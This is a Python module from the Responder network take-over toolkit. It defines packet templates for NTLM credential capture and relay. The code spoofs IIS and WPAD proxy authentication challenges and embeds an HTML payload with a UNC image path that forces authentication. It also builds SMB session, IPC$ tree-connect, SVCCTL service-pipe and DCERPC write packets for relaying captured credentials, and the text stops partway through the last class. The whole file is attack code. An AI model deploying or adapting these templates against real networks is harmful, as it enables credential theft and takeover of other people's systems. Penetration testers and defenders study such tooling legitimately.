#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import os
from odict import OrderedDict
import datetime
from base64 import b64decode, b64encode

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))


##################HTTP Proxy Relay##########################
def HTTPCurrentDate():
    Date = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    return Date

#407 section.
class WPAD_Auth_407_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
		("Connection",    "Proxy-Connection: close\r\n"),
		("Cache-Control",    "Cache-Control: no-cache\r\n"),
		("Pragma",        "Pragma: no-cache\r\n"),
		("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])


class WPAD_NTLM_Challenge_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWWAuth",       "Proxy-Authenticate: NTLM "),
		("Payload",       ""),
		("Payload-CRLF",  "\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])

	def calculate(self,payload):
		self.fields["Payload"] = b64encode(payload)

#401 section:
class IIS_Auth_401_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])

class IIS_Auth_Granted(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 200 OK\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
		("ContentLen",    "Content-Length: "),
		("ActualLen",     "76"),
		("CRLF",          "\r\n\r\n"),
		("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
	])
	def calculate(self):
		self.fields["ActualLen"] = len(str(self.fields["Payload"]))

class IIS_NTLM_Challenge_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWWAuth",       "WWW-Authenticate: NTLM "),
		("Payload",       ""),
		("Payload-CRLF",  "\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])

	def calculate(self,payload):
		self.fields["Payload"] = b64encode(payload)

class IIS_Basic_401_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWW-Auth",      "WWW-Authenticate: Basic realm=\"Authentication Required\"\r\n"),
		("AllowOrigin",   "Access-Control-Allow-Origin: *\r\n"),
		("AllowCreds",    "Access-Control-Allow-Credentials: true\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])

##################WEBDAV Relay Packet#########################
class WEBDAV_Options_Answer(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 200 OK\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Allow",         "Allow: GET,HEAD,POST,OPTIONS,TRACE\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("Keep-Alive:", "Keep-Alive: timeout=5, max=100\r\n"),
		("Connection",    "Connection: Keep-Alive\r\n"),
		("Content-Type",  "Content-Type: text/html\r\n"),
		("CRLF",          "\r\n"),
	])

##################SMB Relay Packet############################
def midcalc(data):  #Set MID SMB Header field.
    return data[34:36]

def uidcalc(data):  #Set UID SMB Header field.
    return data[32:34]

def pidcalc(data):  #Set PID SMB Header field.
    pack=data[30:32]
    return pack

def tidcalc(data):  #Set TID SMB Header field.
    pack=data[28:30]
    return pack

#Response packet.
class SMBRelayNegoAns(Packet):
	fields = OrderedDict([
		("Wordcount",                 "\x11"),
		("Dialect",                   ""),
		("Securitymode",              "\x03"),
		("MaxMpx",                    "\x32\x00"),
		("MaxVc",                     "\x01\x00"),
		("MaxBuffSize",               "\x04\x41\x00\x00"),
		("MaxRawBuff",                "\x00\x00\x01\x00"),
		("SessionKey",                "\x00\x00\x00\x00"),
		("Capabilities",              "\xfd\xf3\x01\x80"),
		("SystemTime",                "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
		("SrvTimeZone",               "\xf0\x00"),
		("KeyLen",                    "\x00"),
		("Bcc",                       "\x10\x00"),
		("Guid",                      os.urandom(16)),
	])

##Response packet.
class SMBRelayNTLMAnswer(Packet):
	fields = OrderedDict([
		("Wordcount",             "\x04"),
		("AndXCommand",           "\xff"),
		("Reserved",              "\x00"),
		("Andxoffset",            "\x5f\x01"),
		("Action",                "\x00\x00"),
		("SecBlobLen",            "\xea\x00"),
		("Bcc",                   "\x34\x01"),
                ###NTLMPACKET
		("Data",                  ""),
                ###NTLMPACKET

	])


#Request packet (no calc):
class SMBSessionSetupAndxRequest(Packet):
	fields = OrderedDict([
		("Wordcount", "\x0c"),
        	("AndXCommand", "\xff"),
        	("Reserved","\x00" ),
       	        ("AndXOffset", "\xec\x00"),              
        	("MaxBuff","\xff\xff"),
        	("MaxMPX", "\x32\x00"),
        	("VCNumber","\x00\x00"),
        	("SessionKey", "\x00\x00\x00\x00"),
                ###NTLMPACKET
		("Data",                  ""),
                ###NTLMPACKET
	])

class SMBSessEmpty(Packet):
	fields = OrderedDict([
		("Empty",       "\x00\x00\x00"),
	])
##################SMB Request Packet##########################
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("errorcode", "\x00\x00\x00\x00" ),
        ("flag1", "\x08"),
        ("flag2", "\x01\xc8"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("Reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x3c\x1b"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNegoCairo(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x00"),
        ("Bcc", "\x62\x00"),
        ("Data", "")
    ])
    
    def calculate(self):
        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))

class SMBNegoCairoData(Packet):
    fields = OrderedDict([
        ("Separator1","\x02" ),
        ("Dialect1", "Cairo 0.xa\x00"), #Let's talk Cairo!
    ])

class SMBSessionSetupAndxNEGO(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("AndXOffset", "\xec\x00"),              
        ("MaxBuff","\xff\xff"),
        ("MaxMPX", "\x32\x00"),
        ("VCNumber","\x00\x00"),
        ("SessionKey", "\x00\x00\x00\x00"),
        ("SecBlobLen","\x4a\x00"),
        ("Reserved2","\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\xe3\x01\x80"), 
        ("Bcc","\xb1\x00"),
        ##gss api starts here.
        ("ApplicationHeaderTag","\x60"),
        ("ApplicationHeaderLen","\x48"),
        ("AsnSecMechType","\x06"),
        ("AsnSecMechLen","\x06"),
        ("AsnSecMechStr","\x2b\x06\x01\x05\x05\x02"),
        ("ChoosedTag","\xa0"),
        ("ChoosedTagStrLen","\x3e"),
        ("NegTokenInitSeqHeadTag","\x30"),
        ("NegTokenInitSeqHeadLen","\x3c"),
        ("NegTokenInitSeqHeadTag1","\xA0"),
        ("NegTokenInitSeqHeadLen1","\x0e"),
        ("NegTokenInitSeqNLMPTag","\x30"),
        ("NegTokenInitSeqNLMPLen","\x0c"),
        ("NegTokenInitSeqNLMPTag1","\x06"),
        ("NegTokenInitSeqNLMPTag1Len","\x0a"),
        ("NegTokenInitSeqNLMPTag1Str","\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenInitSeqNLMPTag2","\xa2"),
        ("NegTokenInitSeqNLMPTag2Len","\x2a"),
        ("NegTokenInitSeqNLMPTag2Octet","\x04"),
        ("NegTokenInitSeqNLMPTag2OctetLen","\x28"),
        ## NTLM packet ##
        ("Data",                           ""),
        ## NTLM packet ##
        ("NegTokenInitSeqMechMessageVersionTerminator","\x00"),
        ("NativeOs","Windows 2002 Service Pack 3 2600"),
        ("NativeOsTerminator","\x00\x00"),
        ("NativeLan","Windows 2002 5.1"),
        ("NativeLanTerminator","\x00\x00\x00\x00"),

    ])
    def calculate(self): 

        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')

        CompleteSMBPacketLen = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["AndXOffset"])+str(self.fields["MaxBuff"])+str(self.fields["MaxMPX"])+str(self.fields["VCNumber"])+str(self.fields["SessionKey"])+str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"])+str(self.fields["Capabilities"])+str(self.fields["Bcc"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])


        SecBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])


        data3 = str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data4 = str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data5 = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])

        data6 = str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data10 = str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])
       
        data11 = str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])


        ## Packet len
        self.fields["AndXOffset"] = struct.pack("<h", len(CompleteSMBPacketLen)+32)
        ##Buff Len
        self.fields["SecBlobLen"] = struct.pack("<h", len(SecBlobLen))
        ##Complete Buff Len
        self.fields["Bcc"] = struct.pack("<h", len(CompleteSMBPacketLen)-27)#session setup struct is 27.
        ##App Header
        self.fields["ApplicationHeaderLen"] = struct.pack("<B", len(SecBlobLen)-2)
        ##Asn Field 1
        self.fields["AsnSecMechLen"] = struct.pack("<B", len(str(self.fields["AsnSecMechStr"])))
        ##Asn Field 1
        self.fields["ChoosedTagStrLen"] = struct.pack("<B", len(data3))
        ##SpNegoTokenLen
        self.fields["NegTokenInitSeqHeadLen"] = struct.pack("<B", len(data4))
        ##NegoTokenInit
        self.fields["NegTokenInitSeqHeadLen1"] = struct.pack("<B", len(data10)) 
        ## Tag0 Len
        self.fields["NegTokenInitSeqNLMPLen"] = struct.pack("<B", len(data11))
        ## Tag0 Str Len
        self.fields["NegTokenInitSeqNLMPTag1Len"] = struct.pack("<B", len(str(self.fields["NegTokenInitSeqNLMPTag1Str"])))
        ## Tag2 Len
        self.fields["NegTokenInitSeqNLMPTag2Len"] = struct.pack("<B", len(data6))
        ## Tag3 Len
        self.fields["NegTokenInitSeqNLMPTag2OctetLen"] = struct.pack("<B", len(str(self.fields["Data"])))


class SMBSessionSetupAndxAUTH(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\xfa\x00"),
        ("maxbuff","\xff\xff"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x59\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xfc\xe3\x01\x80"),
        ("bcc1","\xbf\x00"), 
        ("ApplicationHeaderTag","\xa1"),
        ("ApplicationHeaderTagLenOfLen","\x81"),
        ("ApplicationHeaderLen","\xd1"),
        ("AsnSecMechType","\x30"),
        ("AsnSecMechLenOfLen","\x81"),
        ("AsnSecMechLen","\xce"),
        ("ChoosedTag","\xa2"),
        ("ChoosedTagLenOfLen","\x81"),
        ("ChoosedTagLen","\xcb"),
        ("ChoosedTag1","\x04"),
        ("ChoosedTag1StrLenOfLen","\x81"),
        ("ChoosedTag1StrLen","\xc8"),
        #### NTLM Packet ####
        ("Data",  ""),
        #### End Of SMB ####
        ("NLMPAuthMsgNull","\x00"),
        ("NativeOs","Unix"),
        ("NativeOsTerminator","\x00\x00"),
        ("ExtraNull",""),
        ("NativeLan","Samba"),
        ("NativeLanTerminator","\x00\x00"),
        ("AndxPadding",""),
        ])


    def calculate(self): 
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')

        SecurityBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])

        NTLMData = str(self.fields["Data"])
        ###### ASN Stuff
        if len(NTLMData) > 255:
           self.fields["ApplicationHeaderTagLenOfLen"] = "\x82"
           self.fields["ApplicationHeaderLen"] = struct.pack(">H", len(SecurityBlobLen)-0)
        else:
           self.fields["ApplicationHeaderTagLenOfLen"] = "\x81"
           self.fields["ApplicationHeaderLen"] = struct.pack(">B", len(SecurityBlobLen)-3)

        if len(NTLMData)-8 > 255:
           self.fields["AsnSecMechLenOfLen"] = "\x82"
           self.fields["AsnSecMechLen"] = struct.pack(">H", len(SecurityBlobLen)-4)
        else:
           self.fields["AsnSecMechLenOfLen"] = "\x81"
           self.fields["AsnSecMechLen"] = struct.pack(">B", len(SecurityBlobLen)-6)

        if len(NTLMData)-12 > 255:
           self.fields["ChoosedTagLenOfLen"] = "\x82"
           self.fields["ChoosedTagLen"] = struct.pack(">H", len(SecurityBlobLen)-8) 
        else:
           self.fields["ChoosedTagLenOfLen"] = "\x81"
           self.fields["ChoosedTagLen"] = struct.pack(">B", len(SecurityBlobLen)-9)

        if len(NTLMData)-16 > 255:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x82"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">H", len(SecurityBlobLen)-12)
        else:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x81"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">B", len(SecurityBlobLen)-12)

        CompletePacketLen = str(self.fields["wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["reserved"])+str(self.fields["andxoffset"])+str(self.fields["maxbuff"])+str(self.fields["maxmpx"])+str(self.fields["vcnum"])+str(self.fields["sessionkey"])+str(self.fields["securitybloblength"])+str(self.fields["reserved2"])+str(self.fields["capabilities"])+str(self.fields["bcc1"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])+str(self.fields["NLMPAuthMsgNull"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["ExtraNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])

        SecurityBlobLenUpdated = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])

        ## Packet len
        self.fields["andxoffset"] = struct.pack("<h", len(CompletePacketLen)+32) #SMB1 Header is always 32
        ##Buff Len
        self.fields["securitybloblength"] = struct.pack("<h", len(SecurityBlobLenUpdated))
        ##Complete Buff Len
        self.fields["bcc1"] = struct.pack("<h", len(CompletePacketLen)-27) #SessionSetup struct is 27.

class SMBTreeConnectData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x04"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\x5a\x00"), 
        ("Flags","\x08\x00"),
        ("PasswdLen", "\x01\x00"),
        ("Bcc","\x2f\x00"),
        ("Passwd", "\x00"),
        ("Path","\\\\IPC$"),
        ("PathTerminator","\x00\x00"),
        ("Service","?????"),
        ("Terminator", "\x00"),

    ])
    def calculate(self): 
        ##Convert Path to Unicode first before any Len calc.
        self.fields["Path"] = self.fields["Path"].encode('utf-16le')

        ##Passwd Len
        self.fields["PasswdLen"] = struct.pack("<i", len(str(self.fields["Passwd"])))[:2]

        ##Packet len
        CompletePacket = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["Flags"])+str(self.fields["PasswdLen"])+str(self.fields["Bcc"])+str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])

        self.fields["Andxoffset"] = struct.pack("<i", len(CompletePacket)+32)[:2]

        ##Bcc Buff Len
        BccComplete    = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]

class SMBTreeDisconnect(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x00"),
        ("Bcc","\x00\x00"),

    ])

class SMBNTCreateData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x18"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("Reserved2",     "\x00"),
        ("FileNameLen",   "\x07\x00"),
        ("CreateFlags",   "\x16\x00\x00\x00"),
        ("RootFID",       "\x00\x00\x00\x00"),
        ("AccessMask",    "\x9F\x01\x02\x00"),
        ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("FileAttrib",    "\x00\x00\x00\x00"),
        ("ShareAccess",   "\x03\x00\x00\x00"),
        ("Disposition",   "\x01\x00\x00\x00"),   
        ("CreateOptions", "\x40\x00\x40\x00"),
        ("Impersonation", "\x02\x00\x00\x00"),
        ("SecurityFlags", "\x01"),
        ("Bcc",           "\x08\x00"),
        ("FileName",      ""),
        ("FileNameNull",  "\x00"),
    ])

    def calculate(self):
        Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
        self.fields["Bcc"] = struct.pack("<h",len(Data1))

class SMBNTCreateDataSVCCTL(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x18"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("Reserved2",     "\x00"),
        ("FileNameLen",   "\x07\x00"),
        ("CreateFlags",   "\x16\x00\x00\x00"),
        ("RootFID",       "\x00\x00\x00\x00"),
        ("AccessMask",    "\x00\x00\x00\x02"),
        ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("FileAttrib",    "\x00\x00\x00\x00"),
        ("ShareAccess",   "\x07\x00\x00\x00"),
        ("Disposition",   "\x01\x00\x00\x00"),   
        ("CreateOptions", "\x00\x00\x00\x00"),
        ("Impersonation", "\x02\x00\x00\x00"),
        ("SecurityFlags", "\x00"),
        ("Bcc",           "\x08\x00"),
        ("FileName",      ""),
        ("FileNameNull",  "\x00"),
    ])

    def calculate(self):
        Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
        self.fields["Bcc"] = struct.pack("<h",len(Data1))

class SMBLockingAndXResponse(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x02"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00"),
        ("Andxoffset",    "\x00\x00"),  
        ("Bcc",           "\x00\x00"),
    ])

class SMBReadData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0a"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x00\x00"),
        ("Offset",        "\x19\x03\x00\x00"), 
        ("MaxCountLow",   "\xed\x01"),
        ("MinCount",      "\xed\x01"),
        ("Hidden",        "\xff\xff\xff\xff"),
        ("Remaining",     "\x00\x00"),  
        ("Bcc",           "\x00\x00"),
        ("Data", ""),
    ])

    def calculate(self):

        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBWriteData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0e"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\xde\xde"),
        ("FID",           "\x06\x40"),
        ("Offset",        "\x00\x00\x00\x00"),
        ("TimeOut",       "\x00\x00\x00\x00"),
        ("WriteMode",     "\x01\x00"),
        ("Remaining",     "\x00\x00"),
        ("DataLenHi",     "\x00\x00"),
        ("DataLenLow",    "\xdc\x02"),
        ("DataOffset",    "\x40\x00"),
        ("HiOffset",      "\x00\x00\x00\x00"),   
        ("Bcc",           "\xdc\x02"),
        ("Padding",       "\x41"),
        ("Data", ""),
    ])

    def calculate(self):

        self.fields["DataLenLow"] = struct.pack("<H",len(str(self.fields["Data"])))
        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))

class SMBDCERPCWriteData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0e"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x06\x40"),
        ("Offset",        "\xea\x03\x00\x00"),
        ("Reserved2",     "\xff\xff\xff\xff"),
        ("WriteMode",     "\x08\x00"),
        ("Remaining",     "\xdc\x02"),
        ("DataLenHi",     "\x00\x00"),
        ("DataLenLow",    "\xdc\x02"),
        ("DataOffset",    "\x3f\x00"),
        ("HiOffset",      "\x00\x00\x00\x00"),   
        ("Bcc",           "\xdc\x02"),
        ("Data", ""),
    ])

    def calculate(self):
        self.fields["Remaining"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["DataLenLow"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))



class SMBTransDCERPC(Packet):
    fields = OrderedDict([
        ("Wordcount",             "\x10"),
        ("TotalParamCount",       "\x00\x00"),
        ("TotalDataCount",        "\x00\x00" ),
        ("MaxParamCount",         "\x00\x00"),
